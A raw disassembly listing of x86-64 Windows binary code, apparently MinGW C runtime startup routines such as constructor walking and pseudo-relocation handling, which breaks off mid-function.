   32c4816e1:	74 2a                	je     0x32c48170d
   32c4816e3:	66 90                	xchg   %ax,%ax
   32c4816e5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4816ec:	00 00 00 00 
   32c4816f0:	ff d0                	call   *%rax
   32c4816f2:	48 8b 05 47 79 00 00 	mov    0x7947(%rip),%rax        # 0x32c489040
   32c4816f9:	48 8d 50 08          	lea    0x8(%rax),%rdx
   32c4816fd:	48 8b 40 08          	mov    0x8(%rax),%rax
   32c481701:	48 89 15 38 79 00 00 	mov    %rdx,0x7938(%rip)        # 0x32c489040
   32c481708:	48 85 c0             	test   %rax,%rax
   32c48170b:	75 e3                	jne    0x32c4816f0
   32c48170d:	48 83 c4 28          	add    $0x28,%rsp
   32c481711:	c3                   	ret
   32c481712:	0f 1f 00             	nopl   (%rax)
   32c481715:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48171c:	00 00 00 00 
   32c481720:	56                   	push   %rsi
   32c481721:	53                   	push   %rbx
   32c481722:	48 83 ec 28          	sub    $0x28,%rsp
   32c481726:	48 8b 15 83 ac 00 00 	mov    0xac83(%rip),%rdx        # 0x32c48c3b0
   32c48172d:	48 8b 02             	mov    (%rdx),%rax
   32c481730:	89 c1                	mov    %eax,%ecx
   32c481732:	83 f8 ff             	cmp    $0xffffffff,%eax
   32c481735:	74 39                	je     0x32c481770
   32c481737:	85 c9                	test   %ecx,%ecx
   32c481739:	74 20                	je     0x32c48175b
   32c48173b:	89 c8                	mov    %ecx,%eax
   32c48173d:	83 e9 01             	sub    $0x1,%ecx
   32c481740:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   32c481744:	48 29 c8             	sub    %rcx,%rax
   32c481747:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   32c48174c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481750:	ff 13                	call   *(%rbx)
   32c481752:	48 83 eb 08          	sub    $0x8,%rbx
   32c481756:	48 39 f3             	cmp    %rsi,%rbx
   32c481759:	75 f5                	jne    0x32c481750
   32c48175b:	48 8d 0d 6e ff ff ff 	lea    -0x92(%rip),%rcx        # 0x32c4816d0
   32c481762:	48 83 c4 28          	add    $0x28,%rsp
   32c481766:	5b                   	pop    %rbx
   32c481767:	5e                   	pop    %rsi
   32c481768:	e9 c3 fb ff ff       	jmp    0x32c481330
   32c48176d:	0f 1f 00             	nopl   (%rax)
   32c481770:	31 c0                	xor    %eax,%eax
   32c481772:	0f 1f 00             	nopl   (%rax)
   32c481775:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48177c:	00 00 00 00 
   32c481780:	44 8d 40 01          	lea    0x1(%rax),%r8d
   32c481784:	89 c1                	mov    %eax,%ecx
   32c481786:	4c 89 c0             	mov    %r8,%rax
   32c481789:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   32c48178e:	75 f0                	jne    0x32c481780
   32c481790:	eb a5                	jmp    0x32c481737
   32c481792:	0f 1f 00             	nopl   (%rax)
   32c481795:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48179c:	00 00 00 00 
   32c4817a0:	8b 05 8a d8 00 00    	mov    0xd88a(%rip),%eax        # 0x32c48f030
   32c4817a6:	85 c0                	test   %eax,%eax
   32c4817a8:	74 06                	je     0x32c4817b0
   32c4817aa:	c3                   	ret
   32c4817ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4817b0:	c7 05 76 d8 00 00 01 	movl   $0x1,0xd876(%rip)        # 0x32c48f030
   32c4817b7:	00 00 00 
   32c4817ba:	e9 61 ff ff ff       	jmp    0x32c481720
   32c4817bf:	90                   	nop
   32c4817c0:	83 fa 03             	cmp    $0x3,%edx
   32c4817c3:	74 0b                	je     0x32c4817d0
   32c4817c5:	85 d2                	test   %edx,%edx
   32c4817c7:	74 07                	je     0x32c4817d0
   32c4817c9:	c3                   	ret
   32c4817ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4817d0:	e9 9b 07 00 00       	jmp    0x32c481f70
   32c4817d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4817dc:	00 00 00 00 
   32c4817e0:	56                   	push   %rsi
   32c4817e1:	53                   	push   %rbx
   32c4817e2:	48 83 ec 28          	sub    $0x28,%rsp
   32c4817e6:	48 8b 05 b3 ab 00 00 	mov    0xabb3(%rip),%rax        # 0x32c48c3a0
   32c4817ed:	83 38 02             	cmpl   $0x2,(%rax)
   32c4817f0:	74 06                	je     0x32c4817f8
   32c4817f2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   32c4817f8:	83 fa 02             	cmp    $0x2,%edx
   32c4817fb:	74 13                	je     0x32c481810
   32c4817fd:	83 fa 01             	cmp    $0x1,%edx
   32c481800:	74 4e                	je     0x32c481850
   32c481802:	48 83 c4 28          	add    $0x28,%rsp
   32c481806:	5b                   	pop    %rbx
   32c481807:	5e                   	pop    %rsi
   32c481808:	c3                   	ret
   32c481809:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c481810:	48 8d 1d e9 b2 00 00 	lea    0xb2e9(%rip),%rbx        # 0x32c48cb00
   32c481817:	48 8d 35 e2 b2 00 00 	lea    0xb2e2(%rip),%rsi        # 0x32c48cb00
   32c48181e:	48 39 f3             	cmp    %rsi,%rbx
   32c481821:	74 df                	je     0x32c481802
   32c481823:	66 90                	xchg   %ax,%ax
   32c481825:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48182c:	00 00 00 00 
   32c481830:	48 8b 03             	mov    (%rbx),%rax
   32c481833:	48 85 c0             	test   %rax,%rax
   32c481836:	74 02                	je     0x32c48183a
   32c481838:	ff d0                	call   *%rax
   32c48183a:	48 83 c3 08          	add    $0x8,%rbx
   32c48183e:	48 39 f3             	cmp    %rsi,%rbx
   32c481841:	75 ed                	jne    0x32c481830
   32c481843:	48 83 c4 28          	add    $0x28,%rsp
   32c481847:	5b                   	pop    %rbx
   32c481848:	5e                   	pop    %rsi
   32c481849:	c3                   	ret
   32c48184a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c481850:	48 83 c4 28          	add    $0x28,%rsp
   32c481854:	5b                   	pop    %rbx
   32c481855:	5e                   	pop    %rsi
   32c481856:	e9 15 07 00 00       	jmp    0x32c481f70
   32c48185b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c481860:	31 c0                	xor    %eax,%eax
   32c481862:	c3                   	ret
   32c481863:	90                   	nop
   32c481864:	90                   	nop
   32c481865:	90                   	nop
   32c481866:	90                   	nop
   32c481867:	90                   	nop
   32c481868:	90                   	nop
   32c481869:	90                   	nop
   32c48186a:	90                   	nop
   32c48186b:	90                   	nop
   32c48186c:	90                   	nop
   32c48186d:	90                   	nop
   32c48186e:	90                   	nop
   32c48186f:	90                   	nop
   32c481870:	56                   	push   %rsi
   32c481871:	53                   	push   %rbx
   32c481872:	48 83 ec 38          	sub    $0x38,%rsp
   32c481876:	48 89 cb             	mov    %rcx,%rbx
   32c481879:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   32c48187e:	b9 02 00 00 00       	mov    $0x2,%ecx
   32c481883:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   32c481888:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   32c48188d:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   32c481892:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c481897:	e8 24 67 00 00       	call   0x32c487fc0
   32c48189c:	48 8d 15 1d a6 00 00 	lea    0xa61d(%rip),%rdx        # 0x32c48bec0
   32c4818a3:	48 89 c1             	mov    %rax,%rcx
   32c4818a6:	e8 cd 6b 00 00       	call   0x32c488478
   32c4818ab:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   32c4818b0:	b9 02 00 00 00       	mov    $0x2,%ecx
   32c4818b5:	e8 06 67 00 00       	call   0x32c487fc0
   32c4818ba:	48 89 da             	mov    %rbx,%rdx
   32c4818bd:	49 89 f0             	mov    %rsi,%r8
   32c4818c0:	48 89 c1             	mov    %rax,%rcx
   32c4818c3:	e8 f8 6b 00 00       	call   0x32c4884c0
   32c4818c8:	e8 a3 6b 00 00       	call   0x32c488470
   32c4818cd:	90                   	nop
   32c4818ce:	66 90                	xchg   %ax,%ax
   32c4818d0:	57                   	push   %rdi
   32c4818d1:	56                   	push   %rsi
   32c4818d2:	53                   	push   %rbx
   32c4818d3:	48 83 ec 50          	sub    $0x50,%rsp
   32c4818d7:	48 63 35 96 d7 00 00 	movslq 0xd796(%rip),%rsi        # 0x32c48f074
   32c4818de:	48 89 cb             	mov    %rcx,%rbx
   32c4818e1:	85 f6                	test   %esi,%esi
   32c4818e3:	0f 8e 17 01 00 00    	jle    0x32c481a00
   32c4818e9:	48 8b 05 88 d7 00 00 	mov    0xd788(%rip),%rax        # 0x32c48f078
   32c4818f0:	45 31 c9             	xor    %r9d,%r9d
   32c4818f3:	48 83 c0 18          	add    $0x18,%rax
   32c4818f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4818fe:	00 00 
   32c481900:	4c 8b 00             	mov    (%rax),%r8
   32c481903:	4c 39 c3             	cmp    %r8,%rbx
   32c481906:	72 13                	jb     0x32c48191b
   32c481908:	48 8b 50 08          	mov    0x8(%rax),%rdx
   32c48190c:	8b 52 08             	mov    0x8(%rdx),%edx
   32c48190f:	49 01 d0             	add    %rdx,%r8
   32c481912:	4c 39 c3             	cmp    %r8,%rbx
   32c481915:	0f 82 8a 00 00 00    	jb     0x32c4819a5
   32c48191b:	41 83 c1 01          	add    $0x1,%r9d
   32c48191f:	48 83 c0 28          	add    $0x28,%rax
   32c481923:	41 39 f1             	cmp    %esi,%r9d
   32c481926:	75 d8                	jne    0x32c481900
   32c481928:	48 89 d9             	mov    %rbx,%rcx
   32c48192b:	e8 80 08 00 00       	call   0x32c4821b0
   32c481930:	48 89 c7             	mov    %rax,%rdi
   32c481933:	48 85 c0             	test   %rax,%rax
   32c481936:	0f 84 e6 00 00 00    	je     0x32c481a22
   32c48193c:	48 8b 05 35 d7 00 00 	mov    0xd735(%rip),%rax        # 0x32c48f078
   32c481943:	48 8d 1c b6          	lea    (%rsi,%rsi,4),%rbx
   32c481947:	48 c1 e3 03          	shl    $0x3,%rbx
   32c48194b:	48 01 d8             	add    %rbx,%rax
   32c48194e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   32c481952:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   32c481958:	e8 93 09 00 00       	call   0x32c4822f0
   32c48195d:	8b 57 0c             	mov    0xc(%rdi),%edx
   32c481960:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   32c481966:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   32c48196a:	48 8b 05 07 d7 00 00 	mov    0xd707(%rip),%rax        # 0x32c48f078
   32c481971:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   32c481976:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   32c48197b:	ff 15 87 f8 00 00    	call   *0xf887(%rip)        # 0x32c491208
   32c481981:	48 85 c0             	test   %rax,%rax
   32c481984:	0f 84 7d 00 00 00    	je     0x32c481a07
   32c48198a:	8b 44 24 44          	mov    0x44(%rsp),%eax
   32c48198e:	8d 50 fc             	lea    -0x4(%rax),%edx
   32c481991:	83 e2 fb             	and    $0xfffffffb,%edx
   32c481994:	74 08                	je     0x32c48199e
   32c481996:	8d 50 c0             	lea    -0x40(%rax),%edx
   32c481999:	83 e2 bf             	and    $0xffffffbf,%edx
   32c48199c:	75 12                	jne    0x32c4819b0
   32c48199e:	83 05 cf d6 00 00 01 	addl   $0x1,0xd6cf(%rip)        # 0x32c48f074
   32c4819a5:	48 83 c4 50          	add    $0x50,%rsp
   32c4819a9:	5b                   	pop    %rbx
   32c4819aa:	5e                   	pop    %rsi
   32c4819ab:	5f                   	pop    %rdi
   32c4819ac:	c3                   	ret
   32c4819ad:	0f 1f 00             	nopl   (%rax)
   32c4819b0:	83 f8 02             	cmp    $0x2,%eax
   32c4819b3:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   32c4819b8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   32c4819bd:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   32c4819c3:	b8 04 00 00 00       	mov    $0x4,%eax
   32c4819c8:	44 0f 44 c0          	cmove  %eax,%r8d
   32c4819cc:	48 03 1d a5 d6 00 00 	add    0xd6a5(%rip),%rbx        # 0x32c48f078
   32c4819d3:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   32c4819d7:	49 89 d9             	mov    %rbx,%r9
   32c4819da:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   32c4819de:	ff 15 1c f8 00 00    	call   *0xf81c(%rip)        # 0x32c491200
   32c4819e4:	85 c0                	test   %eax,%eax
   32c4819e6:	75 b6                	jne    0x32c48199e
   32c4819e8:	ff 15 e2 f7 00 00    	call   *0xf7e2(%rip)        # 0x32c4911d0
   32c4819ee:	48 8d 0d 43 a5 00 00 	lea    0xa543(%rip),%rcx        # 0x32c48bf38
   32c4819f5:	89 c2                	mov    %eax,%edx
   32c4819f7:	e8 74 fe ff ff       	call   0x32c481870
   32c4819fc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481a00:	31 f6                	xor    %esi,%esi
   32c481a02:	e9 21 ff ff ff       	jmp    0x32c481928
   32c481a07:	48 8b 05 6a d6 00 00 	mov    0xd66a(%rip),%rax        # 0x32c48f078
   32c481a0e:	8b 57 08             	mov    0x8(%rdi),%edx
   32c481a11:	48 8d 0d e8 a4 00 00 	lea    0xa4e8(%rip),%rcx        # 0x32c48bf00
   32c481a18:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   32c481a1d:	e8 4e fe ff ff       	call   0x32c481870
   32c481a22:	48 89 da             	mov    %rbx,%rdx
   32c481a25:	48 8d 0d b4 a4 00 00 	lea    0xa4b4(%rip),%rcx        # 0x32c48bee0
   32c481a2c:	e8 3f fe ff ff       	call   0x32c481870
   32c481a31:	90                   	nop
   32c481a32:	0f 1f 00             	nopl   (%rax)
   32c481a35:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c481a3c:	00 00 00 00 
   32c481a40:	55                   	push   %rbp
   32c481a41:	41 57                	push   %r15
   32c481a43:	41 56                	push   %r14
   32c481a45:	41 55                	push   %r13
   32c481a47:	41 54                	push   %r12
   32c481a49:	57                   	push   %rdi
   32c481a4a:	56                   	push   %rsi
   32c481a4b:	53                   	push   %rbx
   32c481a4c:	48 83 ec 48          	sub    $0x48,%rsp
   32c481a50:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   32c481a55:	8b 35 15 d6 00 00    	mov    0xd615(%rip),%esi        # 0x32c48f070
   32c481a5b:	85 f6                	test   %esi,%esi
   32c481a5d:	74 11                	je     0x32c481a70
   32c481a5f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   32c481a63:	5b                   	pop    %rbx
   32c481a64:	5e                   	pop    %rsi
   32c481a65:	5f                   	pop    %rdi
   32c481a66:	41 5c                	pop    %r12
   32c481a68:	41 5d                	pop    %r13
   32c481a6a:	41 5e                	pop    %r14
   32c481a6c:	41 5f                	pop    %r15
   32c481a6e:	5d                   	pop    %rbp
   32c481a6f:	c3                   	ret
   32c481a70:	c7 05 f6 d5 00 00 01 	movl   $0x1,0xd5f6(%rip)        # 0x32c48f070
   32c481a77:	00 00 00 
   32c481a7a:	e8 b1 07 00 00       	call   0x32c482230
   32c481a7f:	48 98                	cltq
   32c481a81:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   32c481a85:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   32c481a8c:	00 
   32c481a8d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c481a91:	e8 ea 09 00 00       	call   0x32c482480
   32c481a96:	48 8b 3d 33 a9 00 00 	mov    0xa933(%rip),%rdi        # 0x32c48c3d0
   32c481a9d:	48 8b 1d 3c a9 00 00 	mov    0xa93c(%rip),%rbx        # 0x32c48c3e0
   32c481aa4:	48 29 c4             	sub    %rax,%rsp
   32c481aa7:	c7 05 c3 d5 00 00 00 	movl   $0x0,0xd5c3(%rip)        # 0x32c48f074
   32c481aae:	00 00 00 
   32c481ab1:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   32c481ab6:	48 89 05 bb d5 00 00 	mov    %rax,0xd5bb(%rip)        # 0x32c48f078
   32c481abd:	48 89 f8             	mov    %rdi,%rax
   32c481ac0:	48 29 d8             	sub    %rbx,%rax
   32c481ac3:	48 83 f8 07          	cmp    $0x7,%rax
   32c481ac7:	7e 96                	jle    0x32c481a5f
   32c481ac9:	48 83 f8 0b          	cmp    $0xb,%rax
   32c481acd:	0f 8f 85 01 00 00    	jg     0x32c481c58
   32c481ad3:	8b 13                	mov    (%rbx),%edx
   32c481ad5:	85 d2                	test   %edx,%edx
   32c481ad7:	0f 85 90 01 00 00    	jne    0x32c481c6d
   32c481add:	8b 43 04             	mov    0x4(%rbx),%eax
   32c481ae0:	85 c0                	test   %eax,%eax
   32c481ae2:	0f 85 85 01 00 00    	jne    0x32c481c6d
   32c481ae8:	8b 53 08             	mov    0x8(%rbx),%edx
   32c481aeb:	83 fa 01             	cmp    $0x1,%edx
   32c481aee:	0f 85 cf 02 00 00    	jne    0x32c481dc3
   32c481af4:	48 83 c3 0c          	add    $0xc,%rbx
   32c481af8:	4c 8b 35 c1 a8 00 00 	mov    0xa8c1(%rip),%r14        # 0x32c48c3c0
   32c481aff:	4c 8d 65 f8          	lea    -0x8(%rbp),%r12
   32c481b03:	48 39 fb             	cmp    %rdi,%rbx
   32c481b06:	72 7c                	jb     0x32c481b84
   32c481b08:	e9 52 ff ff ff       	jmp    0x32c481a5f
   32c481b0d:	0f 1f 00             	nopl   (%rax)
   32c481b10:	83 fa 08             	cmp    $0x8,%edx
   32c481b13:	0f 84 1f 02 00 00    	je     0x32c481d38
   32c481b19:	83 fa 10             	cmp    $0x10,%edx
   32c481b1c:	0f 85 79 02 00 00    	jne    0x32c481d9b
   32c481b22:	41 0f b7 07          	movzwl (%r15),%eax
   32c481b26:	66 85 c0             	test   %ax,%ax
   32c481b29:	79 06                	jns    0x32c481b31
   32c481b2b:	48 0d 00 00 ff ff    	or     $0xffffffffffff0000,%rax
   32c481b31:	4c 29 c0             	sub    %r8,%rax
   32c481b34:	4c 01 c8             	add    %r9,%rax
   32c481b37:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   32c481b3d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   32c481b41:	75 18                	jne    0x32c481b5b
   32c481b43:	48 3d ff ff 00 00    	cmp    $0xffff,%rax
   32c481b49:	0f 8f 60 02 00 00    	jg     0x32c481daf
   32c481b4f:	48 3d 00 80 ff ff    	cmp    $0xffffffffffff8000,%rax
   32c481b55:	0f 8c 54 02 00 00    	jl     0x32c481daf
   32c481b5b:	4c 89 f9             	mov    %r15,%rcx
   32c481b5e:	4d 89 e5             	mov    %r12,%r13
   32c481b61:	e8 6a fd ff ff       	call   0x32c4818d0
   32c481b66:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   32c481b6c:	4c 89 e2             	mov    %r12,%rdx
   32c481b6f:	4c 89 f9             	mov    %r15,%rcx
   32c481b72:	e8 29 69 00 00       	call   0x32c4884a0
   32c481b77:	48 83 c3 0c          	add    $0xc,%rbx
   32c481b7b:	48 39 fb             	cmp    %rdi,%rbx
   32c481b7e:	0f 83 7c 00 00 00    	jae    0x32c481c00
   32c481b84:	44 8b 03             	mov    (%rbx),%r8d
   32c481b87:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c481b8a:	44 8b 7b 04          	mov    0x4(%rbx),%r15d
   32c481b8e:	4d 01 f0             	add    %r14,%r8
   32c481b91:	0f b6 d1             	movzbl %cl,%edx
   32c481b94:	4d 8b 08             	mov    (%r8),%r9
   32c481b97:	4d 01 f7             	add    %r14,%r15
   32c481b9a:	83 fa 20             	cmp    $0x20,%edx
   32c481b9d:	0f 84 2d 01 00 00    	je     0x32c481cd0
   32c481ba3:	0f 86 67 ff ff ff    	jbe    0x32c481b10
   32c481ba9:	83 fa 40             	cmp    $0x40,%edx
   32c481bac:	0f 85 e9 01 00 00    	jne    0x32c481d9b
   32c481bb2:	49 8b 07             	mov    (%r15),%rax
   32c481bb5:	4c 29 c0             	sub    %r8,%rax
   32c481bb8:	4c 01 c8             	add    %r9,%rax
   32c481bbb:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   32c481bc1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   32c481bc5:	75 09                	jne    0x32c481bd0
   32c481bc7:	48 85 c0             	test   %rax,%rax
   32c481bca:	0f 89 df 01 00 00    	jns    0x32c481daf
   32c481bd0:	4c 89 f9             	mov    %r15,%rcx
   32c481bd3:	48 83 c3 0c          	add    $0xc,%rbx
   32c481bd7:	4d 89 e5             	mov    %r12,%r13
   32c481bda:	e8 f1 fc ff ff       	call   0x32c4818d0
   32c481bdf:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   32c481be5:	4c 89 e2             	mov    %r12,%rdx
   32c481be8:	4c 89 f9             	mov    %r15,%rcx
   32c481beb:	e8 b0 68 00 00       	call   0x32c4884a0
   32c481bf0:	48 39 fb             	cmp    %rdi,%rbx
   32c481bf3:	72 8f                	jb     0x32c481b84
   32c481bf5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c481bfc:	00 00 00 00 
   32c481c00:	8b 05 6e d4 00 00    	mov    0xd46e(%rip),%eax        # 0x32c48f074
   32c481c06:	85 c0                	test   %eax,%eax
   32c481c08:	0f 8e 51 fe ff ff    	jle    0x32c481a5f
   32c481c0e:	48 8b 3d eb f5 00 00 	mov    0xf5eb(%rip),%rdi        # 0x32c491200
   32c481c15:	31 db                	xor    %ebx,%ebx
   32c481c17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c481c1e:	00 00 
   32c481c20:	48 8b 05 51 d4 00 00 	mov    0xd451(%rip),%rax        # 0x32c48f078
   32c481c27:	48 01 d8             	add    %rbx,%rax
   32c481c2a:	44 8b 00             	mov    (%rax),%r8d
   32c481c2d:	45 85 c0             	test   %r8d,%r8d
   32c481c30:	74 0d                	je     0x32c481c3f
   32c481c32:	48 8b 50 10          	mov    0x10(%rax),%rdx
   32c481c36:	48 8b 48 08          	mov    0x8(%rax),%rcx
   32c481c3a:	4d 89 e9             	mov    %r13,%r9
   32c481c3d:	ff d7                	call   *%rdi
   32c481c3f:	83 c6 01             	add    $0x1,%esi
   32c481c42:	48 83 c3 28          	add    $0x28,%rbx
   32c481c46:	3b 35 28 d4 00 00    	cmp    0xd428(%rip),%esi        # 0x32c48f074
   32c481c4c:	7c d2                	jl     0x32c481c20
   32c481c4e:	e9 0c fe ff ff       	jmp    0x32c481a5f
   32c481c53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c481c58:	44 8b 0b             	mov    (%rbx),%r9d
   32c481c5b:	45 85 c9             	test   %r9d,%r9d
   32c481c5e:	75 0d                	jne    0x32c481c6d
   32c481c60:	44 8b 43 04          	mov    0x4(%rbx),%r8d
   32c481c64:	45 85 c0             	test   %r8d,%r8d
   32c481c67:	0f 84 1a 01 00 00    	je     0x32c481d87
   32c481c6d:	48 39 fb             	cmp    %rdi,%rbx
   32c481c70:	0f 83 e9 fd ff ff    	jae    0x32c481a5f
   32c481c76:	4c 8b 35 43 a7 00 00 	mov    0xa743(%rip),%r14        # 0x32c48c3c0
   32c481c7d:	4c 8d 6d f8          	lea    -0x8(%rbp),%r13
   32c481c81:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481c85:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c481c8c:	00 00 00 00 
   32c481c90:	44 8b 63 04          	mov    0x4(%rbx),%r12d
   32c481c94:	8b 03                	mov    (%rbx),%eax
   32c481c96:	48 83 c3 08          	add    $0x8,%rbx
   32c481c9a:	43 03 04 26          	add    (%r14,%r12,1),%eax
   32c481c9e:	4b 8d 0c 34          	lea    (%r12,%r14,1),%rcx
   32c481ca2:	89 45 f8             	mov    %eax,-0x8(%rbp)
   32c481ca5:	e8 26 fc ff ff       	call   0x32c4818d0
   32c481caa:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   32c481cb0:	4c 89 ea             	mov    %r13,%rdx
   32c481cb3:	4b 8d 0c 34          	lea    (%r12,%r14,1),%rcx
   32c481cb7:	e8 e4 67 00 00       	call   0x32c4884a0
   32c481cbc:	48 39 fb             	cmp    %rdi,%rbx
   32c481cbf:	72 cf                	jb     0x32c481c90
   32c481cc1:	e9 3a ff ff ff       	jmp    0x32c481c00
   32c481cc6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c481ccd:	00 00 00 
   32c481cd0:	41 8b 07             	mov    (%r15),%eax
   32c481cd3:	85 c0                	test   %eax,%eax
   32c481cd5:	79 0d                	jns    0x32c481ce4
   32c481cd7:	49 bb 00 00 00 00 ff 	movabs $0xffffffff00000000,%r11
   32c481cde:	ff ff ff 
   32c481ce1:	4c 09 d8             	or     %r11,%rax
   32c481ce4:	4c 29 c0             	sub    %r8,%rax
   32c481ce7:	4c 01 c8             	add    %r9,%rax
   32c481cea:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   32c481cf0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   32c481cf4:	75 1a                	jne    0x32c481d10
   32c481cf6:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   32c481cfb:	48 39 c8             	cmp    %rcx,%rax
   32c481cfe:	0f 8f ab 00 00 00    	jg     0x32c481daf
   32c481d04:	48 3d 00 00 00 80    	cmp    $0xffffffff80000000,%rax
   32c481d0a:	0f 8c 9f 00 00 00    	jl     0x32c481daf
   32c481d10:	4c 89 f9             	mov    %r15,%rcx
   32c481d13:	4d 89 e5             	mov    %r12,%r13
   32c481d16:	e8 b5 fb ff ff       	call   0x32c4818d0
   32c481d1b:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   32c481d21:	4c 89 e2             	mov    %r12,%rdx
   32c481d24:	4c 89 f9             	mov    %r15,%rcx
   32c481d27:	e8 74 67 00 00       	call   0x32c4884a0
   32c481d2c:	e9 46 fe ff ff       	jmp    0x32c481b77
   32c481d31:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c481d38:	41 0f b6 07          	movzbl (%r15),%eax
   32c481d3c:	84 c0                	test   %al,%al
   32c481d3e:	79 06                	jns    0x32c481d46
   32c481d40:	48 0d 00 ff ff ff    	or     $0xffffffffffffff00,%rax
   32c481d46:	4c 29 c0             	sub    %r8,%rax
   32c481d49:	4c 01 c8             	add    %r9,%rax
   32c481d4c:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   32c481d52:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   32c481d56:	75 0e                	jne    0x32c481d66
   32c481d58:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   32c481d5e:	7f 4f                	jg     0x32c481daf
   32c481d60:	48 83 f8 80          	cmp    $0xffffffffffffff80,%rax
   32c481d64:	7c 49                	jl     0x32c481daf
   32c481d66:	4c 89 f9             	mov    %r15,%rcx
   32c481d69:	4d 89 e5             	mov    %r12,%r13
   32c481d6c:	e8 5f fb ff ff       	call   0x32c4818d0
   32c481d71:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c481d77:	4c 89 e2             	mov    %r12,%rdx
   32c481d7a:	4c 89 f9             	mov    %r15,%rcx
   32c481d7d:	e8 1e 67 00 00       	call   0x32c4884a0
   32c481d82:	e9 f0 fd ff ff       	jmp    0x32c481b77
   32c481d87:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c481d8a:	85 c9                	test   %ecx,%ecx
   32c481d8c:	0f 85 56 fd ff ff    	jne    0x32c481ae8
   32c481d92:	48 83 c3 0c          	add    $0xc,%rbx
   32c481d96:	e9 38 fd ff ff       	jmp    0x32c481ad3
   32c481d9b:	48 8d 0d f6 a1 00 00 	lea    0xa1f6(%rip),%rcx        # 0x32c48bf98
   32c481da2:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   32c481da9:	00 
   32c481daa:	e8 c1 fa ff ff       	call   0x32c481870
   32c481daf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   32c481db4:	4d 89 f8             	mov    %r15,%r8
   32c481db7:	48 8d 0d 0a a2 00 00 	lea    0xa20a(%rip),%rcx        # 0x32c48bfc8
   32c481dbe:	e8 ad fa ff ff       	call   0x32c481870
   32c481dc3:	48 8d 0d 96 a1 00 00 	lea    0xa196(%rip),%rcx        # 0x32c48bf60
   32c481dca:	e8 a1 fa ff ff       	call   0x32c481870
   32c481dcf:	90                   	nop
   32c481dd0:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c481dd7:	00 00 00 
   32c481dda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c481de0:	55                   	push   %rbp
   32c481de1:	57                   	push   %rdi
   32c481de2:	56                   	push   %rsi
   32c481de3:	53                   	push   %rbx
   32c481de4:	48 83 ec 28          	sub    $0x28,%rsp
